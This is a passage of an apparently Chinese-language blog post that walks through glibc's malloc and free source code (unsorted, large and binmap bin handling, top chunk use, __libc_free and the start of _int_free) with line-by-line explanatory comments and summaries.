remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                  remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                &#125;<br><br>               <span class="hljs-comment">//设置chunk的大小和状态</span><br>              set_head (victim, nb | PREV_INUSE |<br>                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>              set_head (remainder, remainder_size | PREV_INUSE);<br>              set_foot (remainder, remainder_size);<br><br>              check_malloced_chunk (av, victim, nb);<br>               <span class="hljs-comment">//返回分配的内存地址</span><br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br><br>          <span class="hljs-comment">/* remove from unsorted list */</span><br>      <span class="hljs-comment">//若chunk不满足条件，则移出unsorted bin</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br><br>          <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br><br>      <span class="hljs-comment">//处理精准匹配</span><br>          <span class="hljs-keyword">if</span> (size == nb)<br>            &#123;<br>              set_inuse_bit_at_offset (victim, size);<br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br><br>          <span class="hljs-comment">/* place chunk in bin */</span><span class="hljs-comment">//将chunk插入到对应的bin中</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<span class="hljs-comment">//chunk在smallbin范围</span><br>            &#123;<br>              victim_index = smallbin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br>            &#125;<br>          <span class="hljs-keyword">else</span><span class="hljs-comment">//largebin范围，插入到largebins中</span><br>            &#123;<br>              victim_index = largebin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                &#123;<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                    &#123;<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                        &#123;<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        &#125;<br><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                      bck = fwd-&gt;bk;<br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            &#125;<br><br>          mark_bin (av, victim_index);<span class="hljs-comment">//标记bin已使用（binmap）</span><br>      <span class="hljs-comment">//更新双向链表</span><br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<span class="hljs-comment">//检查最大尝试次数</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><h3 id="编译后largebins"><a href="#编译后largebins" class="headerlink" title="编译后largebins"></a>编译后largebins</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">         If a large request, scan through the chunks of current bin in</span><br><span class="hljs-comment">         sorted order to find smallest that fits.  Use the skip list for this.</span><br><span class="hljs-comment">       */</span><br><br>      <span class="hljs-keyword">if</span> (!in_smallbin_range (nb))<br>        &#123;<br>          bin = bin_at (av, idx);<span class="hljs-comment">//获取头指针</span><br><br>          <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><span class="hljs-comment">//跳过链表为空或第一个chunk大小小于请求大小</span><br>          <span class="hljs-keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;<br>              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (victim-&gt;size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>            &#123;<br>               <span class="hljs-comment">//寻找大小合适的chunk</span><br>              victim = victim-&gt;bk_nextsize;<br>              <span class="hljs-keyword">while</span> (((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size = chunksize (victim)) &lt;<br>                      (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)))<br>                victim = victim-&gt;bk_nextsize;<br><br>              <span class="hljs-comment">/* Avoid removing the first entry for a size so that the skip</span><br><span class="hljs-comment">                 list does not have to be rerouted.  */</span><br>               <span class="hljs-comment">//若找到的chunk不是最后一个且与下一个chunk大小相同就跳过这个chunk</span><br>              <span class="hljs-keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)<br>                victim = victim-&gt;fd;<br><br>              remainder_size = size - nb;<span class="hljs-comment">//计算剩余大小</span><br>              unlink (av, victim, bck, fwd);<span class="hljs-comment">//移除找到的chunk</span><br><br>              <span class="hljs-comment">/* Exhaust */</span><br>               <span class="hljs-comment">//对剩余部分的处理</span><br>              <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>                &#123;<br>                  set_inuse_bit_at_offset (victim, size);<br>                  <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                    victim-&gt;size |= NON_MAIN_ARENA;<br>                &#125;<span class="hljs-comment">//若剩余部分&lt;MINSIZE，就标记整个chunk已使用</span><br>              <span class="hljs-comment">/* Split */</span><br>              <span class="hljs-keyword">else</span><br>                &#123;<br>                  remainder = chunk_at_offset (victim, nb);<span class="hljs-comment">//分割</span><br>                  <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                     have to perform a complete insert here.  */</span><span class="hljs-comment">/* 我们不能假设unsorted bin是空的，因此必须在这里执行完整的插入操作。 */</span><br>                  bck = unsorted_chunks (av);<br>                  fwd = bck-&gt;fd;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                    &#123;<br>                      errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;<br>                      <span class="hljs-keyword">goto</span> errout;<br>                    &#125;<br>                  remainder-&gt;bk = bck;<br>                  remainder-&gt;fd = fwd;<br>                  bck-&gt;fd = remainder;<br>                  fwd-&gt;bk = remainder;<span class="hljs-comment">//上述代码作用是将剩余部分插入到unsorted bin中</span><br>                  <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                    &#123;<br>                      remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                      remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                    &#125;<br>                  set_head (victim, nb | PREV_INUSE |<br>                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                  set_head (remainder, remainder_size | PREV_INUSE);<br>                  set_foot (remainder, remainder_size);<span class="hljs-comment">//设置分割后的chunk大小与状态</span><br>                &#125;<br>               <span class="hljs-comment">//返回内存地址</span><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>逻辑：</p><ol><li>获取 largebin 的头指针</li><li>在排序链表中查找合适大小的 chunk</li><li>移除找到的 chunk</li><li>如果剩余部分足够大，则分割 chunk，并将剩余部分插入<code>unsorted bin</code></li><li>返回内存地址</li></ol><h3 id="binmap"><a href="#binmap" class="headerlink" title="binmap"></a>binmap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-comment">/*</span><br><span class="hljs-comment">         Search for a chunk by scanning bins, starting with next largest</span><br><span class="hljs-comment">         bin. This search is strictly by best-fit; i.e., the smallest</span><br><span class="hljs-comment">         (with ties going to approximately the least recently used) chunk</span><br><span class="hljs-comment">         that fits is selected.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         The bitmap avoids needing to check that most blocks are nonempty.</span><br><span class="hljs-comment">         The particular case of skipping all bins during warm-up phases</span><br><span class="hljs-comment">         when no chunks have been returned yet is faster than it might look.</span><br><span class="hljs-comment">       */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 通过扫描 bins 来搜索合适的 chunk，从下一个较大的 bin 开始。</span><br><span class="hljs-comment"> * 这种搜索严格遵循最佳拟合策略；即选择最小的（如果有多个大小相同的 chunk，则选择最近最少使用的）chunk。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 位图（binmap）避免了检查大多数块是否为空的需要。</span><br><span class="hljs-comment"> * 在没有返回任何 chunk 的热启动阶段，跳过所有 bins 的情况比看起来要快。</span><br><span class="hljs-comment"> */</span><br><br>      ++idx;<span class="hljs-comment">//从下一个bin开始搜索</span><br>      bin = bin_at (av, idx);<span class="hljs-comment">//获取当前bin的指针</span><br>      block = idx2block (idx);<span class="hljs-comment">//计算当前bin所在块索引</span><br>      <span class="hljs-built_in">map</span> = av-&gt;binmap[block];<span class="hljs-comment">//获取当前块的binmap</span><br>      bit = idx2bit (idx);<span class="hljs-comment">//获取当前bin对应的位</span><br><br>      <span class="hljs-keyword">for</span> (;; )<br>        &#123;<br>          <span class="hljs-comment">/* Skip rest of block if there are no more set bits in this block.  */</span><br>          <span class="hljs-keyword">if</span> (bit &gt; <span class="hljs-built_in">map</span> || bit == <span class="hljs-number">0</span>)<br>            &#123;<br>              <span class="hljs-keyword">do</span><span class="hljs-comment">//若超出bins的范围就跳到使用top chunk</span><br>                &#123;<br>                  <span class="hljs-keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="hljs-comment">/* out of bins */</span><br>                    <span class="hljs-keyword">goto</span> use_top;<br>                &#125;<br>              <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">map</span> = av-&gt;binmap[block]) == <span class="hljs-number">0</span>);<br><br>              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));<br>              bit = <span class="hljs-number">1</span>;<br>            &#125;<br><br>          <span class="hljs-comment">/* Advance to bin with set bit. There must be one. */</span><br>          <span class="hljs-keyword">while</span> ((bit &amp; <span class="hljs-built_in">map</span>) == <span class="hljs-number">0</span>)<span class="hljs-comment">//找到第一个非空bin</span><br>            &#123;<br>              bin = next_bin (bin);<br>              bit &lt;&lt;= <span class="hljs-number">1</span>;<br>              assert (bit != <span class="hljs-number">0</span>);<br>            &#125;<br><br>          <span class="hljs-comment">/* Inspect the bin. It is likely to be non-empty */</span><br>          victim = last (bin);<span class="hljs-comment">//获取bin最后一个chunk</span><br><br>          <span class="hljs-comment">/*  If a false alarm (empty bin), clear the bit. */</span><br>          <span class="hljs-keyword">if</span> (victim == bin)<span class="hljs-comment">//若bin为空</span><br>            &#123;<br>              av-&gt;binmap[block] = <span class="hljs-built_in">map</span> &amp;= ~bit; <span class="hljs-comment">/* Write through */</span><span class="hljs-comment">//清除对应的位</span><br>              bin = next_bin (bin);<br>              bit &lt;&lt;= <span class="hljs-number">1</span>;<br>            &#125;<br><br>          <span class="hljs-keyword">else</span><span class="hljs-comment">//若不为空</span><br>            &#123;<br>              size = chunksize (victim);<span class="hljs-comment">//获取大小</span><br><br>              <span class="hljs-comment">/*  We know the first chunk in this bin is big enough to use. */</span><br>              assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb));<br><br>              remainder_size = size - nb;<span class="hljs-comment">//剩余部分</span><br><br>              <span class="hljs-comment">/* unlink */</span><br>              unlink (av, victim, bck, fwd);<br><br>              <span class="hljs-comment">/* Exhaust */</span><br>              <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<span class="hljs-comment">//剩余&lt;MINSIZE</span><br>                &#123;<br>                  set_inuse_bit_at_offset (victim, size);<span class="hljs-comment">//标记整个chunk为已使用</span><br>                  <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                    victim-&gt;size |= NON_MAIN_ARENA;<br>                &#125;<br><br>              <span class="hljs-comment">/* Split */</span><br>              <span class="hljs-keyword">else</span><span class="hljs-comment">//分割</span><br>                &#123;<br>                  remainder = chunk_at_offset (victim, nb);<br><br>                  <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                     have to perform a complete insert here.  */</span><br>                   <span class="hljs-comment">//将剩余部分插入unsorted bin</span><br>                  bck = unsorted_chunks (av);<br>                  fwd = bck-&gt;fd;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                    &#123;<br>                      errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;<br>                      <span class="hljs-keyword">goto</span> errout;<br>                    &#125;<br>                  remainder-&gt;bk = bck;<br>                  remainder-&gt;fd = fwd;<br>                  bck-&gt;fd = remainder;<br>                  fwd-&gt;bk = remainder;<br><br>                  <span class="hljs-comment">/* advertise as last remainder */</span><br>                  <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>                    av-&gt;last_remainder = remainder;<br>                  <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                    &#123;<br>                      remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                      remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                    &#125;<br>                  set_head (victim, nb | PREV_INUSE |<br>                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                  set_head (remainder, remainder_size | PREV_INUSE);<br>                  set_foot (remainder, remainder_size);<br>                &#125;<span class="hljs-comment">//设置大小状态</span><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<span class="hljs-comment">//返回地址</span><br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>总结：</p><ol><li>从下一个较大的 bin 开始搜索。</li><li>使用位图跳过空块，提高搜索效率。</li><li>在非空 bin 中找到合适的 chunk。</li><li>如果找到的 chunk 大小合适，则直接分配。</li><li>如果 chunk 大小过大，则分割 chunk，并将剩余部分插入<code>unsorted bin</code></li><li>返回分配的内存地址。</li></ol><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c">use_top:<br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">         If large enough, split off the chunk bordering the end of memory</span><br><span class="hljs-comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span><br><span class="hljs-comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span><br><span class="hljs-comment">         less well fitting) than any other available chunk since it can</span><br><span class="hljs-comment">         be extended to be as large as necessary (up to system</span><br><span class="hljs-comment">         limitations).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span><br><span class="hljs-comment">         MINSIZE) after initialization, so if it would otherwise be</span><br><span class="hljs-comment">         exhausted by current request, it is replenished. (The main</span><br><span class="hljs-comment">         reason for ensuring it exists is that we may need MINSIZE space</span><br><span class="hljs-comment">         to put in fenceposts in sysmalloc.)</span><br><span class="hljs-comment">       */</span><br><br>      victim = av-&gt;top;<span class="hljs-comment">//获取top chunk</span><br>      size = chunksize (victim);<span class="hljs-comment">//获取top的大小</span><br><br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<span class="hljs-comment">//top chunk足够大</span><br>        &#123;<br>          remainder_size = size - nb;<span class="hljs-comment">//计算剩余</span><br>          remainder = chunk_at_offset (victim, nb);<span class="hljs-comment">//分割</span><br>          av-&gt;top = remainder;<br>          set_head (victim, nb | PREV_INUSE |<br>                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>          set_head (remainder, remainder_size | PREV_INUSE);<span class="hljs-comment">//设置剩余部分头部信息</span><br><br>          check_malloced_chunk (av, victim, nb);<br>          <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>          alloc_perturb (p, bytes);<br>          <span class="hljs-keyword">return</span> p;<span class="hljs-comment">//返回分配的内存地址</span><br>        &#125;<br><br>      <span class="hljs-comment">/* When we are using atomic ops to free fast chunks we can get</span><br><span class="hljs-comment">         here for all block sizes.  */</span><br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (have_fastchunks (av))<span class="hljs-comment">//合并fastbins后再次尝试分配</span><br>        &#123;<br>          malloc_consolidate (av);<span class="hljs-comment">//合并fastbins</span><br>          <span class="hljs-comment">/* restore original bin index */</span><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>            idx = smallbin_index (nb);<br>          <span class="hljs-keyword">else</span><br>            idx = largebin_index (nb);<br>        &#125;<br><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">         Otherwise, relay to handle system-dependent cases</span><br><span class="hljs-comment">       */</span><br>      <span class="hljs-keyword">else</span><span class="hljs-comment">//上述都不满足，则调用系统级内存分配函数</span><br>        &#123;<br>          <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<span class="hljs-comment">//调用系统级内存分配函数</span><br>          <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>            alloc_perturb (p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>总结：</p><ol><li>使用 <code>top chunk</code> 分配内存。</li><li>合并 fastbins 后再次尝试分配</li><li>调用系统级内存分配函数（如 <code>sbrk</code> 或 <code>mmap</code>）</li></ol><h2 id="libc-free"><a href="#libc-free" class="headerlink" title="_libc_free"></a>_libc_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>__libc_free (<span class="hljs-type">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br><br>     <span class="hljs-comment">//检查是否有用户自定义逻辑</span><br>  <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      (*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)                              <span class="hljs-comment">/* free(0) has no effect （free(0)无任何效果i）*/</span><br>    <span class="hljs-keyword">return</span>;<span class="hljs-comment">//如果传入指针是NULL直接返回</span><br><br>  p = mem2chunk (mem);<span class="hljs-comment">//将用户指针转换为chunk指针</span><br><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))    <span class="hljs-comment">//看是否是mmap分配的内存块                   /* release mmapped memory. */</span><br>    &#123;<br>      <span class="hljs-comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span><br>       <span class="hljs-comment">//动态调整相关</span><br>      <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold<br>          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)<br>        &#123;<br>          mp_.mmap_threshold = chunksize (p);<br>          mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                      mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>      munmap_chunk (p);<span class="hljs-comment">//mmap对应的释放函数</span><br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<span class="hljs-comment">//调用释放函数</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><h3 id="初始化："><a href="#初始化：" class="headerlink" title="初始化："></a>初始化：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-type">int</span> have_lock)<br>&#123;<br>  INTERNAL_SIZE_T size;        <span class="hljs-comment">/* its size */</span><br>  mfastbinptr *fb;             <span class="hljs-comment">/* associated fastbin(相关的fastbin) */</span><br>  mchunkptr nextchunk;         <span class="hljs-comment">/* next contiguous chunk （紧邻的下一个chunk）*/</span><br>  INTERNAL_SIZE_T nextsize;    <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-type">int</span> nextinuse;               <span class="hljs-comment">/* true if 